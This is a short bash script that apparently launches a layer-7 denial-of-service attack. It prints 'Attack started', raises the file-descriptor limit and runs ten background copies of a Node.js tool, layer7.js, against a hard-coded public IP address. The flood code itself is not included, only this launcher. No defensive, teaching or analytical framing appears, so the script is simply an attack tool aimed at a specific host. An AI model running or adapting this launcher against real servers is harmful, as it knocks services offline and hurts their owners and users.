#!/bin/bash

cmd="node layer7.js http://95.211.208.171 100"

process=10
ulimit -n 999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $cmd >/dev/null &
  sleep 0.1
done
